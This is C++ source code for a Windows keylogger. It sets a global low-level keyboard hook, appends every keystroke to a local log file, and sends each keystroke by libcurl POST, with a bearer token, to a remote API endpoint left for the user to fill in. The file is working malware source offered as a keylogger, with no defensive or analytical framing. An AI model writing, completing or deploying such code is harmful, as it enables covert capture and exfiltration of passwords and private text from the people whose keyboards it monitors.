#include <windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <curl/curl.h>  // For using libcurl

using namespace std;

HHOOK hook;
ofstream logfile;
string apiUrl = "";  // Replace with your API URL
string apiKey = "";  // Replace with your actual API key

// Function to send keystrokes to the API
void SendKeystrokeToAPI(const string& keystroke) {
    CURL *curl;
    CURLcode res;
    struct curl_slist *headers = NULL;

    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        // Set up the request headers (including API key for authentication)
        headers = curl_slist_append(headers, ("Authorization: Bearer " + apiKey).c_str());
        headers = curl_slist_append(headers, "Content-Type: application/json");

        // Set the API endpoint and data to send (keystrokes)
        string postData = "{\"keystroke\":\"" + keystroke + "\"}";

        curl_easy_setopt(curl, CURLOPT_URL, apiUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());

        res = curl_easy_perform(curl);

        if(res != CURLE_OK) {
            cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    curl_global_cleanup();
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
        
        // Write to log file if the key is pressed
        if (wParam == WM_KEYDOWN) {
            char key = MapVirtualKey(pKbd->vkCode, MAPVK_VK_TO_CHAR);
            string keystroke(1, key);
            
            logfile << keystroke;

            // Send keystroke to API
            SendKeystrokeToAPI(keystroke);
        }
    }
    
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

// Start the keylogger
void StartKeylogger() {
    logfile.open("keylog.txt", ios::app);
    if (!logfile.is_open()) {
        cout << "Failed to open log file!" << endl;
        return;
    }
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    if (hook == NULL) {
        cout << "Failed to set up hook!" << endl;
        return;
    }
    
    // Enter message loop to keep listening for keyboard events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    logfile.close();
}

int main() {
    cout << "Keylogger started!" << endl;
    StartKeylogger();
    return 0;
}
